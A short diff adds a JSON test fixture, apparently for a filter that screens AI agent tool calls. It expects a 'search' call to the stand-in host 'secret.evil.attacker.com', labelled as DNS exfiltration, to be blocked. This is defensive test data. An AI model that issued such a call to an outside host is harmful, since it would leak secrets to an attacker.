@@ -1,0 +1,9 @@
+{
+  "category": "dns-exfil",
+  "toolName": "search",
+  "arguments": {
+    "host": "secret.evil.attacker.com"
+  },
+  "ruleHint": "dns-exfiltration",
+  "expected": "block"
+}
